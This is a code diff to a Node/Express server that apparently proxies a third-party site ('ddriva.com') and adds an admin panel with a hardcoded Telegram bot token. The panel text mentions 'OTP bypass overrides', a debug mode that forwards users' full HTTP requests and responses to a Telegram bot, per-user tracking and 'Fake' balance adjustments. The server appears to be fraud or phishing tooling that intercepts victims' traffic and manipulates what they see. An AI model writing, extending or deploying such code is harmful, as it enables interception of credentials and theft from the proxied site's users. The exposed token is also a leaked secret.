@@ -290,7 +290,7 @@ function solveSlideCaptcha(masterB64, thumbB64, dispY) {
 
 const app = express();
 const ORIGINAL_API = 'https://appm9t5zk.ddriva.com';
-const BOT_TOKEN = process.env.BOT_TOKEN || '8959979027:AAF3YDbFvkUe_uxDEI6ojaycyqrZZVUAeZA';
+let BOT_TOKEN = process.env.BOT_TOKEN || '8959979027:AAF3YDbFvkUe_uxDEI6ojaycyqrZZVUAeZA';
 const WEBHOOK_URL = 'https://xchas.vercel.app/bot-webhook';
 
 // === SECONDARY BOT CONFIGURATION ===
@@ -320,6 +320,7 @@ const DEFAULT_DATA = {
   botEnabled: true,
   autoRotate: false,
   lastUsedIndex: -1,
+  botToken: '8959979027:AAF3YDbFvkUe_uxDEI6ojaycyqrZZVUAeZA',
   adminChatId: null,
   logRequests: true,
   logDebugRequests: false,
@@ -582,11 +583,24 @@ async function loadData(forceRefresh) {
       if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
       if (!cachedData.balanceHistory) cachedData.balanceHistory = [];
 
+      // Sync dynamic Bot variables
+      if (cachedData.botToken) {
+        if (BOT_TOKEN !== cachedData.botToken) {
+          BOT_TOKEN = cachedData.botToken;
+          try { 
+            bot = new TelegramBot(BOT_TOKEN); 
+            webhookSet = false; // Trigger re-set of webhook
+          } catch (e) { }
+        }
+      }
       // Sync dynamic BOT2 variables
       if (cachedData.bot2Token) {
         if (BOT2_TOKEN !== cachedData.bot2Token) {
           BOT2_TOKEN = cachedData.bot2Token;
-          try { bot2 = new TelegramBot(BOT2_TOKEN); } catch (e) { }
+          try { 
+            bot2 = new TelegramBot(BOT2_TOKEN); 
+            webhook2Set = false; // Trigger re-set of webhook
+          } catch (e) { }
         }
       }
       if (cachedData.bot2ChatId) BOT2_CHAT_ID = cachedData.bot2ChatId;
@@ -3623,8 +3637,8 @@ app.get('/yougogirl', async (req, res) => {
                     </div>
                     <div class="w-px h-6 bg-slate-700"></div>
                     <div class="flex items-center gap-2">
-                        <span class="status-dot ${debugMode ? 'bg-amber-500 shadow-[0_0_10px_#f59e0b]' : 'bg-slate-600'}"></span>
-                        <span class="text-xs font-bold uppercase tracking-wider">${debugMode ? 'Debug ON' : 'Debug OFF'}</span>
+                        <span class="status-dot ${data.logDebugRequests ? 'bg-amber-500 shadow-[0_0_10px_#f59e0b]' : 'bg-slate-600'}"></span>
+                        <span class="text-xs font-bold uppercase tracking-wider">${data.logDebugRequests ? 'Debug ON' : 'Debug OFF'}</span>
                     </div>
                 </div>
                 <div class="glass px-5 py-3 rounded-2xl text-xs font-bold uppercase tracking-wider text-sky-400">
@@ -3663,6 +3677,9 @@ app.get('/yougogirl', async (req, res) => {
                 <div onclick="showTab('system')" class="tab-btn" id="btn-system">
                     <i class="fa-solid fa-sliders w-6"></i> System Config
                 </div>
+                <div onclick="showTab('mainbot')" class="tab-btn" id="btn-mainbot">
+                    <i class="fa-solid fa-gear w-6"></i> Main Bot
+                </div>
                 <div onclick="showTab('bot2')" class="tab-btn" id="btn-bot2">
                     <i class="fa-solid fa-robot w-6"></i> Second Bot
                 </div>
@@ -3691,7 +3708,7 @@ app.get('/yougogirl', async (req, res) => {
                         </div>
                         <div class="card group cursor-pointer" onclick="toggleDebug()">
                             <div class="text-slate-500 text-[10px] font-bold uppercase mb-2">Debug Mode</div>
-                            <div class="text-xl font-black ${debugMode ? 'text-amber-400' : 'text-slate-500'}">${debugMode ? 'ACTIVE' : 'OFF'}</div>
+                            <div class="text-xl font-black ${data.logDebugRequests ? 'text-amber-400' : 'text-slate-500'}">${data.logDebugRequests ? 'ACTIVE' : 'OFF'}</div>
                         </div>
                     </div>
 
@@ -3816,7 +3833,10 @@ app.get('/yougogirl', async (req, res) => {
                     <div class="card overflow-hidden">
                         <div class="flex items-center justify-between mb-6">
                             <h3 class="text-xl font-bold">Real-time User Tracking</h3>
-                            <div class="text-xs text-slate-500">Updates automatically on reload</div>
+                            <div class="flex items-center gap-4">
+                                <button onclick="clearAllTracking()" class="text-xs font-bold text-rose-500 hover:underline">Clear All Data</button>
+                                <div class="text-xs text-slate-500">Updates automatically on reload</div>
+                            </div>
                         </div>
                         <div class="overflow-x-auto">
                             <table class="w-full text-left text-sm">
@@ -3824,9 +3844,9 @@ app.get('/yougogirl', async (req, res) => {
                                     <tr>
                                         <th class="pb-4">User Details</th>
                                         <th class="pb-4">Balance Status</th>
+                                        <th class="pb-4 text-center">Logging</th>
                                         <th class="pb-4">Activity</th>
-                                        <th class="pb-4">Logging</th>
-                                        <th class="pb-4 text-right">Status</th>
+                                        <th class="pb-4 text-right">Action</th>
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-800">
@@ -3843,16 +3863,18 @@ app.get('/yougogirl', async (req, res) => {
                                                 (added !== 0 ? '<div class="text-[10px] ' + (added > 0 ? 'text-emerald-400' : 'text-rose-500') + '">Fake: ' + (added > 0 ? '+' : '') + added + '</div>' : '') +
                                             '</td>' +
                                             '<td class="py-4">' +
-                                                '<div class="text-xs">' + (u.lastAction || 'Login') + '</div>' +
-                                                '<div class="text-[10px] text-slate-500">' + (u.lastSeen || 'N/A') + '</div>' +
-                                            '</td>' +
-                                            '<td class="py-4">' +
                                                 '<button onclick="toggleUserLog(\'' + uid + '\')" class="badge ' + (isOff ? 'bg-rose-500/10 text-rose-500' : 'bg-emerald-500/10 text-emerald-500') + '">' +
                                                     (isOff ? 'OFF' : 'ON') +
                                                 '</button>' +
                                             '</td>' +
+                                            '<td class="py-4">' +
+                                                '<div class="text-[10px] font-bold text-slate-500">' + (u.orderCount || 0) + ' ORDERS</div>' +
+                                                '<div class="text-[9px] text-slate-600">' + (u.lastSeen || 'N/A') + '</div>' +
+                                            '</td>' +
                                             '<td class="py-4 text-right">' +
-                                                '<span class="text-[10px] font-bold text-slate-500">' + (u.orderCount || 0) + ' ORDERS</span>' +
+                                                '<button onclick="deleteTracking(\'' + uid + '\')" class="text-rose-500 hover:text-rose-400 transition-colors">' +
+                                                    '<i class="fa-solid fa-trash-can"></i>' +
+                                                '</button>' +
                                             '</td>' +
                                         '</tr>';
                                     }).join('')}
@@ -4037,9 +4059,37 @@ app.get('/yougogirl', async (req, res) => {
                             <i class="fa-solid fa-triangle-exclamation"></i> Advanced Debug Control
                         </h3>
                         <p class="text-sm text-slate-400 mb-4">Debug mode will send full HTTP request/response payloads to the Telegram admin bot. Use only for troubleshooting.</p>
-                        <button onclick="toggleDebug()" class="px-6 py-2.5 rounded-xl font-bold ${debugMode ? 'bg-amber-500 text-white' : 'bg-slate-800 text-slate-400'} transition-all">
-                            ${debugMode ? 'Deactivate Debug Mode' : 'Activate Debug Mode'}
+                        <button onclick="toggleDebug()" class="px-6 py-2.5 rounded-xl font-bold ${data.logDebugRequests ? 'bg-amber-500 text-white' : 'bg-slate-800 text-slate-400'} transition-all">
+                            ${data.logDebugRequests ? 'Deactivate Debug Mode' : 'Activate Debug Mode'}
                         </button>
+                    </div>
+                </section>
+
+                <!-- Tab: Main Bot -->
+                <section id="tab-mainbot" class="tab-content space-y-6">
+                    <div class="card">
+                        <h3 class="text-xl font-bold mb-6 flex items-center gap-2">
+                            <i class="fa-solid fa-gear text-sky-400"></i> Main Bot Configuration
+                        </h3>
+                        <div class="space-y-6">
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Main Bot Token</label>
+                                <input type="text" id="mainbot-token" value="${data.botToken || ''}" class="input-field font-mono text-xs" placeholder="Enter Main Bot Token">
+                            </div>
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Admin Chat ID</label>
+                                <input type="text" id="mainbot-chatId" value="${data.adminChatId || ''}" class="input-field font-mono text-xs" placeholder="Enter Admin Chat ID">
+                            </div>
+                            <div class="p-4 bg-sky-500/10 rounded-2xl border border-sky-500/20">
+                                <div class="flex gap-3">
+                                    <i class="fa-solid fa-circle-info text-sky-400 mt-1"></i>
+                                    <div class="text-xs text-sky-200/70 leading-relaxed">
+                                        Main Bot handle karta hai aapke saare administrative tasks, OTP bypass overrides, aur real-time user activity alerts. Token change karne par bot automatically restart ho jayega.
+                                    </div>
+                                </div>
+                            </div>
+                            <button onclick="updateMainBot()" class="btn-primary w-full">Save Main Bot Settings</button>
+                        </div>
                     </div>
                 </section>
 
@@ -4220,6 +4270,25 @@ app.get('/yougogirl', async (req, res) => {
             const chatId = document.getElementById('bot2-chatId').value;
             const enabled = document.getElementById('bot2-enabled').checked;
             apiCall('/update-bot2', { token, chatId, enabled });
+        }
+
+        function updateMainBot() {
+            const token = document.getElementById('mainbot-token').value;
+            const chatId = document.getElementById('mainbot-chatId').value;
+            if (!token || !chatId) return notify('Token and Chat ID required', 'error');
+            apiCall('/mainbot/save', { token, chatId });
+        }
+
+        function deleteTracking(userId) {
+            if (confirm('Delete tracking data for user ' + userId + '?')) {
+                apiCall('/tracking/delete', { userId });
+            }
+        }
+
+        function clearAllTracking() {
+            if (confirm('Are you sure you want to clear ALL user tracking data?')) {
+                apiCall('/tracking/clear', {});
+            }
         }
     </script>
 </body>
@@ -4423,8 +4492,45 @@ app.post('/yougogirl/api/service/update', async (req, res) => {
 
 app.post('/yougogirl/api/debug/toggle', async (req, res) => {
   try {
-    debugMode = !debugMode;
-    res.json({ success: true, debugMode });
+    const data = await loadData(true);
+    data.logDebugRequests = !data.logDebugRequests;
+    debugMode = data.logDebugRequests;
+    await saveData(data);
+    res.json({ success: true, debugMode: data.logDebugRequests });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/mainbot/save', async (req, res) => {
+  try {
+    const { token, chatId } = req.parsedBody || {};
+    const data = await loadData(true);
+    if (token) data.botToken = token;
+    if (chatId) data.adminChatId = chatId;
+    await saveData(data);
+    res.json({ success: true, message: 'Main Bot configuration updated' });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/tracking/delete', async (req, res) => {
+  try {
+    const { userId } = req.parsedBody || {};
+    const data = await loadData(true);
+    if (data.trackedUsers && data.trackedUsers[userId]) {
+      delete data.trackedUsers[userId];
+      await saveData(data);
+      res.json({ success: true, message: 'User tracking deleted' });
+    } else {
+      res.status(404).json({ success: false, error: 'User not found' });
+    }
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/tracking/clear', async (req, res) => {
+  try {
+    const data = await loadData(true);
+    data.trackedUsers = {};
+    await saveData(data);
+    res.json({ success: true, message: 'All user tracking cleared' });
   } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
